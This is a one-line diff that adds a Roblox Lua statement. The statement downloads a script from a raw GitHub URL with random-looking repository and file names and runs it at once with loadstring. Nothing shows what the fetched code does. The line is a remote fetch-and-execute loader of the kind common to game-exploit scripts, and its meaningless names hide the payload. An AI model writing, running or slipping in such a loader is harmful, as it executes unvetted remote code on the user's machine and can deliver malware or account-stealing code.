@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/NNPeanut/AHSGDIASGDIAGOAGSDGA/master/sfsfsadfsfdasefwq%20fsdafeasfad'))()
